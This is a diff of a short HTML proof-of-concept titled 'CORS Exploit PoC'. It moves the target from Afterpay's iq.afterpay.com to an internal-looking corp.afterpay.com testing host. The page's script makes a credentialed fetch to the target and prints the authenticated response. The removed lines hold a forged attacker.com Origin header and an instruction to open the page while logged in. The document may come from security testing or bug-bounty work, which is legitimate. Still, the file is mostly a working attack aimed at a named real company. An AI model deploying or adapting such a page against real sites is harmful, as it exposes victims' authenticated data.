@@ -1,24 +1,24 @@
-<!-- Save as poc.html and open in browser while logged into Afterpay -->
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>🔥 CORS Exploit PoC</title>
+  </head>
   <body>
-    <h1>🔥 CORS Exploit PoC</h1>
-    <p>Trying to fetch authenticated content from: <code>https://iq.afterpay.com</code></p>
+    <h2>🔥 CORS Exploit PoC</h2>
+    <p>Trying to fetch authenticated content from: <b>https://dq-testing-dev.corp.afterpay.com</b></p>
+    <pre id="output"></pre>
 
     <script>
-      fetch("https://iq.afterpay.com", {
+      fetch("https://dq-testing-dev.corp.afterpay.com", {
         method: "GET",
-        credentials: "include",
-        headers: {
-          "Origin": "https://iq.afterpay.com.attacker.com"
-        }
+        credentials: "include"
       })
-      .then(response => response.text())
+      .then(res => res.text())
       .then(data => {
-        document.body.innerHTML += `<pre>${data}</pre>`;
+        document.getElementById("output").textContent = data;
       })
       .catch(err => {
-        document.body.innerHTML += `<pre>❌ Error:\n${err}</pre>`;
+        document.getElementById("output").textContent = "❌ Error:\n" + err;
       });
     </script>
   </body>
